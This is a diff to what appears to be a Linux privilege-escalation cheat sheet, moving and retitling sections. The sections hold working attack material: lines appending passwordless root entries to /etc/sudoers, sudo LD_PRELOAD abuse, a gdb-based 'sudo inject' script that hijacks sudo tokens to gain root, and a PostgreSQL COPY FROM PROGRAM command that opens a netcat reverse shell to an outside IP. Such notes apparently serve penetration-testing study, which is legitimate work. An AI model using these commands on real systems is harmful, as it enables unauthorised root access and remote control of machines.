@@ -797,6 +797,12 @@ openssl passwd -1 -salt hack password123
 ```
 echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
 echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
+
+# Allow members of group sudo to execute any command
+%sudo	ALL=(ALL:ALL) ALL
+
+# Allow members of group admin to execute any command
+%admin 	ALL=(ALL:ALL) ALL
 ```
 ### Abusing LD_PRELOAD
 
@@ -823,7 +829,11 @@ We can now use this shared object file when launching any program our user can r
 sudo LD_PRELOAD=/tmp/shell.so find
 ```
 
-###### Sudo Inject
+### Sudo Inject
+>Requirements  
+>Ptrace fully enabled (/proc/sys/kernel/yama/ptrace_scope == 0).  
+>Current user must have living process that has a valid sudo token with the same uid.  
+>The default password timeout is 15 minutes. So if you use sudo twice in 15 minutes (900 seconds), you will not be asked to type the user’s password again.
 ```
 $ sudo whatever
 [sudo] password for user:    # Press <ctrl>+c since you don't have the password. # This creates an invalid sudo tokens.
@@ -833,8 +843,9 @@ $ sudo -i # no password required :)
 # id
 uid=0(root) gid=0(root) groups=0(root)
 ```
-exploit.sh
 ```
+exploit.sh:
+
 #!/bin/sh
 # create an invalid sudo entry for the current shell
 echo | sudo -S >/dev/null 2>&1
@@ -850,11 +861,7 @@ do
                 | gdb -q -n -p "$pid" >/dev/null 2>&1
 done
 ```
-Requirements  
-Ptrace fully enabled (/proc/sys/kernel/yama/ptrace_scope == 0).  
-Current user must have living process that has a valid sudo token with the same uid.  
->The default password timeout is 15 minutes. So if you use sudo twice in 15 minutes (900 seconds), you will not be asked to type the user’s password again.
-###### Postgresql to RCE
+### Postgresql to RCE
 ```
 To run system commands on Linux or Windows, we need to use the PROGRAM parameter. We start with creating a table; we can name — shell.
 
@@ -871,17 +878,8 @@ command execution:
 CREATE TABLE shell(output text);
 COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.226 1234 >/tmp/f';
 ```
-###### Check Compressed files
+### Check Compressed files
 ```
 check zip,gz,7z,stix,rar files
-```
-
-###### Abusing /etc/sudoers
-```
-# Allow members of group sudo to execute any command
-%sudo	ALL=(ALL:ALL) ALL
-
-# Allow members of group admin to execute any command
-%admin 	ALL=(ALL:ALL) ALL
 ```
 
